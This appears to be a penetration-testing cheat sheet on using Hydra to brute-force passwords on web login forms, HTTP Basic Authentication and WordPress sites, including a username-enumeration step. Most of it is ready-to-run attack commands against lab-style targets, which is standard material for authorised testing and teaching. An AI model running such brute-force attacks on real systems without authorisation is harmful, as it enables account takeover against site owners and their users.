**Hydra** supports a wide range of protocols, including SMB, HTTP, FTP, SMTP, Telnet, SSH, and many others. It works by sending multiple login attempts to the target system using a wordlist or custom dictionary file that contains potential usernames and passwords. Hydra then systematically tries each combination until it finds a successful login or exhausts all possibilities.

```bash
hydra -l <username> -P <password_list_path> <service>://<IP_or_domain_name>
```

---

## Using Hydra in a web login page

It can be useful to intercept the request with Burp Suite to extract the correct parameters and form fields used in the login request.

|Option|Description|
|---|---|
|-l|Specify the username (e.g., admin). Use -L for a username list.|
|-P <password_list>|Provide the path to the password list.|
|-f|Stop after the first successful attempt.|
|<target_IP_or_URL>|Target IP address or domain name.|
|-s|Specifies a certain port.|
|/path_to_login_form|The URI path of the login form (e.g., /login.php).|
|username_field=^USER^&password_field=^PASS^|Replace username_field and password_field with the actual form parameter names.|
|error_message|The response text shown when login fails (e.g., "Invalid username or password").|
|http-post-form|Specifies the HTTP method and login form details.|

```bash
hydra -l <username> -P <wordlist> <host> http-post-form "<path>:<username_parameter>=^USER^&<password_parameter>=^PASS^:<failure_message>"
```

Example of brute-forcing a typical login form discovered with Burp:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Example using a custom port:

```bash
hydra -l admin -P passwords.txt 10.10.10.10 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"
```

Example with multiple usernames:

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"
```


### Using hydra against HTTP Basic Authentication

If the web application uses **Basic Authentication**, Hydra can brute-force it directly without specifying POST parameters.

Generic syntax:

```bash
hydra -l <username> -P <password_list> <target> http-get
```

Example against a protected page:

```bash
hydra -l admin -P rockyou.txt example.com http-get /admin
```

Example with custom port:

```bash
hydra -l admin -P passwords.txt 10.10.10.20 http-get /admin -s 8080
```

### Using hydra in a Wordpress login page

First enumerate users:

```bash
hydra -L /path/to/wordlist.txt -p fakepass target-site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
```

Then use the extracted user to do a brute-force attack to obtain the password.

```bash
hydra -L <extracted_user> -P /path/to/wordlist.txt target-site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username <user> is incorrect."
```

Maybe you need to change the error message value.

Example using a single enumerated user:

```bash
hydra -l admin -P rockyou.txt target-site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect"
```

### Basic Auth Example

HTTP Basic Authentication is a simple authentication mechanism where the browser sends the credentials in the `Authorization` header encoded in Base64. When accessing a protected resource, the server responds with `401 Unauthorized` and requests authentication. Hydra can brute-force these credentials using the `http-get` module.

```bash
hydra -l <username> -P <password_list> <target> http-get <protected_path> -s <port>
```

Example against a protected admin panel:

```bash
hydra -L users.txt -P passwords.txt example.com http-get /admin
```

